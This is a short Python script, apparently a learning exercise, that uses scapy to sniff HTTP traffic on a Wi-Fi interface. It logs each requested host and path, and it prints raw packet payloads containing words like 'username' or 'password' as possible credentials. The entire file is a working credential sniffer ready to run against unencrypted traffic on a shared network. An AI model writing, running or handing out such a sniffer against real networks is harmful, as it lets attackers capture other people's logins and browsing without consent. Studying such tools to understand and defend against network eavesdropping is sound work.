from scapy.layers import http
import scapy.all as scapy

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_packet    )


def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print(f"HTTP Request to >> {url}")
        credentials = get_credentials(packet)
        if credentials:
            print(f"Possible credentials >> {credentials}")

def get_url(packet):
    return packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode()

def get_credentials(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load.decode(errors="ignore")
        keywords = ["username", "user", "login", "password", "pass"]
        for keyword in keywords:
            if keyword in load.lower():
                return load
    return None
if __name__ == "__main__":
    sniff("Wi-Fi")